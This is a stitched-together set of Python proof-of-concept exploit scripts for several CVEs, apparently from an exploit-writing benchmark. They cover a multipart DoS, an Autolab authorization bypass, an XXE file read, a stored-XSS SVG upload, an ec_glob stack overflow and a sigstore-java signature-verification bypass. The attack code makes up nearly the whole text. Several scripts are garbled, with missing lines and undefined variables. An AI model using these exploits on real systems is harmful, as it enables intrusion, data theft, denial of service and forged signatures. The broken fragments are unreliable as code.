    epilogue = f"\r\n--{boundary}--\r\n".encode()
    content_length = len(preamble) + payload_size + len(epilogue)

    print(f"[*] Connecting to {host}:{port} – streaming {payload_size:,} bytes")

    conn = http.client.HTTPConnection(host, port)
    conn.putrequest("POST", path)
    conn.putheader("Host", host)
    conn.putheader("Content-Type", f"multipart/form-data; boundary={boundary}")
    conn.putheader("Content-Length", str(content_length))
    conn.endheaders()

    # Send preamble
    conn.send(preamble)

    # Stream body without keeping it all in client RAM
    chunk = b"A" * 65536  # 64 KiB pattern
    remaining = payload_size
    while remaining:
        to_send = chunk if remaining >= len(chunk) else chunk[:remaining]
        conn.send(to_send)
        remaining -= len(to_send)

    # Send epilogue
    conn.send(epilogue)

    print("[*] Payload transmitted, awaiting server response …")
    try:
        resp = conn.getresponse()
        print(f"[+] Server replied {resp.status} {resp.reason}")
        print(resp.read(200).decode(errors="replace"))
    except Exception as exc:
        print(f"[!] Error getting response: {exc}")
        print("    (Server likely crashed – DoS successful.)")

if __name__ == "__main__":
    main()

#!/usr/bin/env python3
"""
Autolab 3.0.1 – CVE-2024-52584 Proof-of-Concept

USAGE:
    python3 exploit.py <submission_id>

ARGUMENTS:
    submission_id – the numeric id of a Submission that *does NOT belong to
                    DevCourse* (e.g. “1” from the default seed data).

WHAT IT DOES:
  • Logs in as the seeded Course Assistant ‘dev_ca@foo.bar’.
  • Issues a GET request to
      /courses/DevCourse/assessments/lab0/submission_popover
    with the supplied submission_id.
  • Prints HTTP status and the first 500 characters of the response.
    On vulnerable Autolab v3.0.1 this returns 200 and the HTML pop-over of
    the foreign submission (should be 403 in v3.0.2).

Ensure the Rails dev server is running on http://localhost:3000 before
running this script.
"""
import re, sys, requests

if len(sys.argv) != 2:
    print("Usage: exploit.py <submission_id>")
    sys.exit(1)

SUB_ID = sys.argv[1]
BASE   = "http://localhost:3000"

# 1. GET developer_login page to fetch CSRF token

r.raise_for_status()

    print("[-] Could not locate CSRF token")
    sys.exit(1)

    "utf8": "✓",
    "authenticity_token": token,
    "email": "dev_ca@foo.bar"
}

# 3. Call vulnerable endpoint with out-of-scope submission_id

       f"submission_popover?submission_id={SUB_ID}")

#!/usr/bin/env python3
"""
PoC for CVE-2024-52596 – XXE in SimpleSAMLphp xml-common <=1.19.0

USAGE:
    python3 exploit.py '<target-file>'

ARGUMENTS:
    <target-file> – Absolute path to a file on the vulnerable host that
                    will be read.  Example: /etc/passwd

The script crafts malicious XML referencing the target file through an
external subset and feeds it to SimpleSAML\XML\DOMDocumentFactory::fromString().
When executed in the vulnerable environment the parser opens the file
during XML load, demonstrating the XXE.
"""
import sys, textwrap, subprocess

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <file-to-read>")
    sys.exit(1)

target = sys.argv[1]
subset = f"php://filter/convert.base64-encode/resource={target}"

xml = textwrap.dedent(f"""<?xml version='1.0'?>
<!DOCTYPE data SYSTEM "{subset}">
<data/>
""")

php_inline = r"""
<?php
require __DIR__ . '/vendor/autoload.php';
use SimpleSAML\XML\DOMDocumentFactory;
$xml = stream_get_contents(STDIN);
try {
    SimpleSAML\XML\DOMDocumentFactory::fromString($xml);
} catch (Exception $e) {
    // expected – Doctype detected after XXE has triggered
}
?>
"""

proc = subprocess.run(
    ['php', '-d', 'short_open_tag=0', '-r', php_inline],
    input=xml.encode(),
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)

print("[+] Malicious XML delivered.  Check tracer/logs for file access.")
print("[+] Parser returned code:", proc.returncode)

#!/usr/bin/env python3
"""
PoC for CVE-2024-52597 – Stored XSS via SVG upload in 2FAuth ≤5.4.0

USAGE
-----
    python exploit.py <svg_payload_file>

ARGUMENTS
---------
    <svg_payload_file> : Path to an SVG file containing your malicious JavaScript.

The script will:
    1. Fetch a CSRF token from /refresh-csrf (anonymous request).
    2. Log into the application with the seeded test credentials:
       email="testingUser@2fauth.app"  password="password"
       (these are created by TestingSeeder in the provided environment).
    3. Upload the supplied SVG to /api/v1/icons while re-using the same CSRF token
       that is embedded inside the authentication cookie (laravel_token).
    4. Print the filename and the full URL where the stored XSS can be triggered,
       e.g.  http://127.0.0.1:8000/storage/icons/<random>.svg

NOTE:  The script only uploads the file – simply visit the printed URL in a
browser that is authenticated to the same origin to execute the embedded <script>.
"""
import sys, pathlib, requests

BASE = "http://127.0.0.1:8000"
LOGIN_ENDPOINT = f"{BASE}/user/login"
CSRF_ENDPOINT  = f"{BASE}/refresh-csrf"
UPLOAD_ENDPOINT = f"{BASE}/api/v1/icons"
STORAGE_URL = f"{BASE}/storage/icons/{{}}"

PASSWORD = "password"

    print("Usage: python exploit.py <svg_payload_file>")
    sys.exit(1)

    print(f"[!] File not found: {svg_path}")

# exploit.py
# ---------------------------------------------
# PoC for CVE-2024-53849 – stack-based buffer overflow in ec_glob()
#
# USAGE:
#   python exploit.py <N>
#
#   <N> : number of back-slashes to place inside a bracket expression.
#         Any value larger than 8300 will overflow the 8194-byte buffer.
#         Example that reliably crashes: 9000
#
# The script
#   1. Builds a tiny C harness that calls ec_glob() with the malicious pattern
#      "[" + "\\"*N + "]".
#   2. Links it against the vulnerable static library (libeditorconfig_static.a)
#      which is present in ./lib .
#   3. Executes the harness.  The process aborts with "stack smashing detected",
#      demonstrating successful exploitation.
#
# Only the payload (<N>) is taken as input as required by the task.

import os, sys, subprocess, tempfile, textwrap

# ------------------------------------------------------------------ helpers
def die(msg):
    print(msg, file=sys.stderr)
    sys.exit(1)

if len(sys.argv) != 2 or not sys.argv[1].isdigit():
    die("Usage: python exploit.py <backslash_count>  (e.g. 9000)")

count = int(sys.argv[1])
if count < 1:
    die("backslash_count must be positive")

# ------------------------------------------------------------------ generate C harness
harness_src = textwrap.dedent(f"""
    #include <stdlib.h>
    #include <string.h>
    #include "src/lib/ec_glob.h"

    int main(void) {{
        int n = {count};
        char *pattern = (char*)malloc((size_t)n + 3);
        pattern[0] = '[';
        memset(pattern + 1, '\\\\', (size_t)n);
        pattern[n + 1] = ']';
        pattern[n + 2] = '\\0';

        /* call the vulnerable function */
        return ec_glob(pattern, "dummy.txt");
    }}
""")

    tmp_c.name,
    "-Isrc/auto", "-Iinclude", "-I.",
    "-Llib", "-leditorconfig_static", "-lpcre2-8",
    "-o", exe_path,
]

"""
PoC for CVE-2024-54140 – sigstore-java ≤ 1.1.0

INPUT FORMAT:
    python3 exploit.py <bundle_path>

ARGUMENT
    bundle_path – path to an existing *.sigstore / *.sigstore.json bundle.

WHAT THE SCRIPT DOES
    • Locates the first Rekor checkpoint envelope inside the bundle.
    • Base64-decodes the “keyHint+signature” block.
    • Flips the lowest bit of the last byte of the ECDSA signature (keeping the
      ASN.1/DER structure valid).
    • Writes the modified bundle back to the same file.

Running “sigstore-cli verify …” against the tampered bundle on a vulnerable
sigstore-java 1.1.0 installation still reports success, demonstrating the flaw.
"""

import json, sys, base64, copy, os

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <bundle_path>")
    sys.exit(1)

bundle_path = sys.argv[1]

# ---- load bundle -----------------------------------------------------------
with open(bundle_path, "r", encoding="utf-8") as fh:
    bundle = json.load(fh)

try:
    envelope = bundle["verificationMaterial"]["tlogEntries"][0]["inclusionProof"]["checkpoint"]["envelope"]
except (KeyError, IndexError, TypeError):
    sys.exit("Could not locate checkpoint envelope inside bundle")

lines = envelope.split("\n")
sig_line_idx = -2 if lines[-1] == "" else -1          # signature line position
parts = lines[sig_line_idx].split(" ")
if len(parts) < 3:
    sys.exit("Unexpected checkpoint signature line format")

b64_blob = parts[-1]
raw = bytearray(base64.b64decode(b64_blob))
if len(raw) < 5:
    sys.exit("Decoded keyHint+signature too short")

key_hint = raw[:4]
sig_bytes = bytearray(raw[4:])

# Flip one bit in the last byte of the ECDSA signature
sig_bytes[-1] ^= 0x01

new_blob = base64.b64encode(key_hint + sig_bytes).decode()
parts[-1] = new_blob
lines[sig_line_idx] = " ".join(parts)
bundle["verificationMaterial"]["tlogEntries"][0]["inclusionProof"]["checkpoint"]["envelope"] = "\n".join(lines)

# ---- write back ------------------------------------------------------------
with open(bundle_path, "w", encoding="utf-8") as fh:
    json.dump(bundle, fh, separators=(",", ":"), ensure_ascii=False)

print(f"[+] Tampered checkpoint signature in {bundle_path}")
